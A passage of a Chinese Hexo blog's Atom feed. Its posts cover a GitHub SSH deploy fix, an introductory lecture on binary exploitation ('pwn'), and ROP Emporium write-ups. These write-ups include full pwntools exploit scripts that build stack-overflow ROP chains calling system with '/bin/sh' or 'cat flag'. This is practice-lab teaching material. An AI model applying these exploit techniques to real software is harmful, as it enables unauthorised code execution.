    <content type="html"><![CDATA[<p>由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。</p><p>起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。</p><p>刚开始以为是ssh的原因，我重新生成，然后把原来的删掉了，然后添加了新的具体过程如下：</p><pre class="language-none"><code class="language-none">ssh-keygen -t rsa -C "youremail@example.com"</code></pre><p>在本地生成 .ssh 文件夹，然后复制其中的id_rsa.pub中的内容放到github中setting上的SSH中</p><p>这就添加完毕了，然后验证</p><pre class="language-none"><code class="language-none">ssh -T git@github.com # github地址</code></pre><p>如果提示<code>Are you sure you want to continue connecting (yes/no)?</code>，输入yes，然后会看到：</p><blockquote><p>Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>看到这个信息说明SSH已配置成功！</p><p>而我的就没有，显示</p><pre class="language-none"><code class="language-none">Permission denied</code></pre><p>很无奈，后来查百度后发现是自己的本机的这个git仓库并没有和这个SSH key 关联上</p><pre class="language-none"><code class="language-none">ssh-agent bashssh-add "/home/ubuntu/.ssh/id_rsa"</code></pre><p>回显</p><pre class="language-none"><code class="language-none">Identity added: /home/ubuntu/.ssh/id_rsa (/home/ubuntu/.ssh/id_rsa)</code></pre><p>然后hexo d成功部署</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。&lt;/p&gt;
&lt;p&gt;起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。&lt;/p&gt;
&lt;p&gt;刚开始以为是ssh的原</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="problems" scheme="http://example.com/tags/problems/"/>
    
  </entry>
  
  <entry>
    <title>第一次讲课</title>
    <link href="http://example.com/2021/03/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B2%E8%AF%BE/"/>
    <id>http://example.com/2021/03/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B2%E8%AF%BE/</id>
    <published>2021-03-13T07:29:16.000Z</published>
    <updated>2021-08-24T08:32:12.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn知识"><a href="#pwn知识" class="headerlink" title="pwn知识"></a>pwn知识</h1><h2 id="什么是pwn"><a href="#什么是pwn" class="headerlink" title="什么是pwn"></a>什么是pwn</h2><p>Pwn可以简单概括为软件的漏洞的挖掘和利用（二进制攻防）。</p><h2 id="涉及到的知识"><a href="#涉及到的知识" class="headerlink" title="涉及到的知识"></a>涉及到的知识</h2><p>涉及计算机学科的众多方向，而且大多偏底层。包括不限于，C语言，C++，python，数 据结构，计算机组成原理，操作系统，编译原理，计算机网络等。</p><h2 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a>linux基础</h2><p>虚拟机：Ubuntu版本不限（但是以后做题的时候会用到不同版本的Ubuntu，具体题目具体分析）</p><p>基本命令：</p><h3 id="ls命令-dir"><a href="#ls命令-dir" class="headerlink" title="ls命令 dir"></a>ls命令 dir</h3><p>就是 list 的缩写，通过 ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。</p><h3 id="cd-命令"><a href="#cd-命令" class="headerlink" title="cd 命令"></a>cd 命令</h3><p>cd(changeDirectory) 命令语法：</p><pre class="language-none"><code class="language-none">cd [目录名] </code></pre><p>说明：切换当前目录至 dirName。</p><h3 id="mkdir-filename"><a href="#mkdir-filename" class="headerlink" title="mkdir  filename"></a>mkdir  filename</h3><p>创建文件夹。</p><h3 id="python安装"><a href="#python安装" class="headerlink" title="python安装"></a>python安装</h3><pre class="language-none"><code class="language-none">sudo apt-get install  python</code></pre><p>安装。（只能安装库中有的软件程序）</p><pre class="language-none"><code class="language-none">sudo apt-get updatesudo apt-get upgrade</code></pre><ul><li><p>安装 git，gdb </p><pre class="language-none"><code class="language-none">sudo apt-get install git sudo apt-get install gdb </code></pre></li><li><p>pip安装</p><pre class="language-none"><code class="language-none">sudo apt-get install python3-pip</code></pre></li><li><p>安装pwntools</p><pre class="language-none"><code class="language-none">pip3 install pwntools</code></pre></li></ul><h2 id="PWN类型"><a href="#PWN类型" class="headerlink" title="PWN类型"></a>PWN类型</h2><p>栈漏洞，<strong>堆漏洞</strong>，格式化字符串漏洞，整型漏洞，<strong>逻辑漏洞</strong></p><p>buuctf   第二排第三个  level0</p><p><img src="https://image.3001.net/images/20180803/1533302977_5b6458c1e6d51.png!small" alt="push_pop.png" loading="lazy"></p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20180823164911166" alt="这里写图片描述" loading="lazy"></p><h1 id="pwn练习"><a href="#pwn练习" class="headerlink" title="pwn练习"></a>pwn练习</h1><h2 id="ROP-Emporium"><a href="#ROP-Emporium" class="headerlink" title="ROP Emporium"></a>ROP Emporium</h2><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a><a href="https://ropemporium.com/challenge/ret2win.html">ret2win</a></h3><h4 id="测偏移"><a href="#测偏移" class="headerlink" title="测偏移"></a>测偏移</h4><p>cyclic 0x32</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20201107143639149.png" alt="image-20201107143639149" loading="lazy"></p><p>cyclic(0x32).find(‘kaaalaaam’)</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20201107143659414.png" alt="image-20201107143659414" loading="lazy"></p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20201107143749971.png" alt="image-20201107143749971" loading="lazy"></p><p>找到system函数地址</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python">from pwn import *context.log_level='debug'p = process('./ret2win')p = remote('',***)system_addr = 0x0400824payload = 'a'*40+p64(system_addr)   #0x20+8p.sendline(payload)p.interactive()</code></pre><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><h4 id="x64传参方式："><a href="#x64传参方式：" class="headerlink" title="x64传参方式："></a>x64传参方式：</h4><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20201107150942904.png" alt="image-20201107150058709" loading="lazy"></p><p>需要bin/sh或者cat flag</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20201107151048320.png" alt="image-20201107151048320" loading="lazy"></p><p>测偏移，详情见上题</p><p>使用ROPgadget</p><pre class="language-none"><code class="language-none">ROPgadget --binary ./split --only'pop|ret'</code></pre><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20201107151349027.png" alt="image-20201107151349027" loading="lazy"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python">from pwn import *p = process('./split')#elf = ELF('./split')system_addr = 0x00400810#system_addr = elf.symbols['system']cat_flag_addr = 0x00601060pop_rdi_ret = 0x00400883payload = 'A'*40+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)p.sendline(payload)p.interactive()</code></pre><h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><h4 id="IDA-启动！"><a href="#IDA-启动！" class="headerlink" title="IDA 启动！"></a>IDA 启动！</h4><p>字符串分析</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161900784.png" alt="image-20210824161900784" loading="lazy"></p><p>IDA_字符串检查</p><ul><li><p>libcallme.so : 之前文件夹里面的libcallme库</p></li><li><p>callme one/two/three : 可能为libcallme中的函数</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161923243.png" alt="image-20210824161923243" loading="lazy"></p><p>usefulFuction</p><p>这个函数使得我们可以调用callme one/two/three,并且得知这三个函数分别需要三个参数</p></li></ul><h4 id="libcallme-so"><a href="#libcallme-so" class="headerlink" title="libcallme.so"></a>libcallme.so</h4><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161935651.png" alt="image-20210824161935651" loading="lazy"></p><p>libcallme</p><p>果然，三个函数在这里</p><h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><h5 id="1-callme-one"><a href="#1-callme-one" class="headerlink" title="1.callme_one"></a>1.callme_one</h5><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161946434.png" alt="image-20210824161946434" loading="lazy"></p><p>callme_one</p><p>发现它的作用是读取已经加密了的flag.txt</p><h5 id="2-callme-two"><a href="#2-callme-two" class="headerlink" title="2.callme_two"></a>2.callme_two</h5><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161956592.png" alt="image-20210824161956592" loading="lazy"></p><p>callme_two</p><p>发现是利用key1.dat进行一些解密工作</p><h5 id="3-callme-three"><a href="#3-callme-three" class="headerlink" title="3.callme_three"></a>3.callme_three</h5><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824162005281.png" alt="image-20210824162005281" loading="lazy"></p><p>callme_three</p><p>和callme_two差不多，也是进行解密工作</p><h4 id="分析漏洞点函数"><a href="#分析漏洞点函数" class="headerlink" title="分析漏洞点函数"></a>分析漏洞点函数</h4><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824162014681.png" alt="image-20210824162014681" loading="lazy"></p><p>pwnme</p><p>是pwnme函数的一个fgets溢出漏洞<br> 同样得到偏移值0x20+8</p><h4 id="查看plt表"><a href="#查看plt表" class="headerlink" title="查看plt表"></a>查看plt表</h4><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824162025678.png" alt="image-20210824162025678" loading="lazy"></p><p>plt表</p><p>得到地址</p><pre class="language-undefined" data-language="undefined"><code class="language-undefined">callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>使用ROP实现跳转</li><li>使用plt表调用函数<br>关于plt表：<a href="https://links.jianshu.com/go?to=https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解</a></li></ul><blockquote><p>PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址</p></blockquote><blockquote><p>其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GO表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'#context.terminnal = ['gnome-terminal','-e']p = process('./callme')elf = ELF('./callme')#0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; retpppad = 0x00401ab0callme_three = elf.plt['callme_three']callme_two = elf.plt['callme_two']callme_one = elf.plt['callme_one']#gdb.attach(p)payload = 'a' * 40payload += p64(pppad+3)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_one)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_two)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_three)p.recvuntil('&gt;')p.sendline(payload)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn知识&quot;&gt;&lt;a href=&quot;#pwn知识&quot; class=&quot;headerlink&quot; title=&quot;pwn知识&quot;&gt;&lt;/a&gt;pwn知识&lt;/h1&gt;&lt;h2 id=&quot;什么是pwn&quot;&gt;&lt;a href=&quot;#什么是pwn&quot; class=&quot;headerlink&quot; title=&quot;什</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/03/13/hello-world/"/>
    <id>http://example.com/2021/03/13/hello-world/</id>
    <published>2021-03-13T05:53:10.160Z</published>
    <updated>2021-08-24T08:17:27.572Z</updated>
    
    <content type="html"><![CDATA[<p>第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。</p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="new-world"><a href="#new-world" class="headerlink" title="new world"></a>new world</h3><pre class="language-bash" data-language="bash"><code class="language-bash">print('Hello World!')</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ROPempire</title>
    <link href="http://example.com/2020/10/02/ROPempire/"/>
    <id>http://example.com/2020/10/02/ROPempire/</id>
    <published>2020-10-01T17:25:52.000Z</published>
    <updated>2021-08-24T08:16:43.832Z</updated>
    
    <content type="html"><![CDATA[<p>##ret2win</p><pre class="language-python" data-language="python"><code class="language-python">from pwn import *p = process('./ret2win')system_addr = 0x0400824pad = 'a'*0x20+'deadbeef'payload = pad+p64(system_addr)p.sendline(payload)p.interactive()</code></pre><p>##split<br>考察将字符串通过寄存器存到函数当中，要熟练掌握x86与x64的传参规律.</p><pre class="language-python" data-language="python"><code class="language-python">from pwn import *p = process('./split')#elf = ELF('./split')system_addr = 0x00400810#system_addr = elf.symbols['system']cat_flag_addr = 0x00601060pop_rdi_ret = 0x00400883pad = 'A'*40payload = pad+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)p.sendline(payload)p.interactive()</code></pre><p>##callme<br>对参数传递的考察</p><pre class="language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'p = process('./callme')elf = ELF('./callme')# info# gadgetpppr = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; retcallme_three = 0x401810callme_two = 0x401870callme_one = 0x401850# rop1offset = 40payload = '\0'*offsetpayload += p64(pppr+3)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) # debug()p.recvuntil('&gt;')p.sendline(payload)p.interactive()</code></pre><p>##write4<br>考察通过将字符串写入.bss段来将字符串传递给system函数然后getshell，同时考察gadget的选取与对段的理解。</p><pre class="language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'p = process('./write4')sys_addr = 0x00400810bss_addr = 0x601060mov_r14_r15 = 0x400820pop_r14_r15 = 0x400890pop_rdi = 0x400893payload = 'a'*(0x20+8)payload += p64(pop_r14_r15)   #清空寄存器payload += p64(bss_addr)        #向r14中写入bss段地址payload += "/bin/sh".ljust(8,"\x00")    #向r15中写入/bin/sh\x00payload += p64(mov_r14_r15)         #将r15中的字符串写入r14payload += p64(pop_rdi)             #清空rdipayload += p64(bss_addr)            #向rdi中写入bss中的字符串payload += p64(sys_addr)            #rdi向system传参p.recvuntil('&gt;')p.sendline(payload)p.recv()p.interactive()</code></pre><p>##badchars</p><pre class="language-python" data-language="python"><code class="language-python">from pwn import *p = process('./badchars')elf = ELF('./badchars')context.log_level = 'debug'# gadgetprdi = 0x400b39 p1213 = 0x400b3bm1213 = 0x400b34system = 0x04009E8#system = elf.plt['system']p1415 = 0x400b40x1415 = 0x400b30'''   0x400b30 &lt;usefulGadgets&gt;:    xor    BYTE PTR [r15],r14b   0x400b33 &lt;usefulGadgets+3&gt;:  ret       0x400b34 &lt;usefulGadgets+4&gt;:  mov    QWORD PTR [r13+0x0],r12   0x400b38 &lt;usefulGadgets+8&gt;:  ret       0x400b39 &lt;usefulGadgets+9&gt;:  pop    rdi=&gt; 0x400b3a &lt;usefulGadgets+10&gt;: ret       0x400b3b &lt;usefulGadgets+11&gt;: pop    r12   0x400b3d &lt;usefulGadgets+13&gt;: pop    r13   0x400b3f &lt;usefulGadgets+15&gt;: ret       0x400b40 &lt;usefulGadgets+16&gt;: pop    r14   0x400b42 &lt;usefulGadgets+18&gt;: pop    r15   0x400b44 &lt;usefulGadgets+20&gt;: ret   '''# rop1offset = 40payload = 'A'*offset# filtered: bic/ fns# $0 is okay, but use gadget x1415 to get /bin/sh via xor is the goal (too lazy to write exp) payload += p64(p1213) + '$0\0\0\0\0\0\0' + p64(elf.bss()+0x400) + p64(m1213) payload += p64(prdi) + p64(elf.bss()+0x400) + p64(system)# debug()p.recvuntil('&gt;')p.sendline(payload)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;##ret2win&lt;/p&gt;
&lt;pre class=&quot;language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *

p = process(&#39;./ret2win</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
</feed>
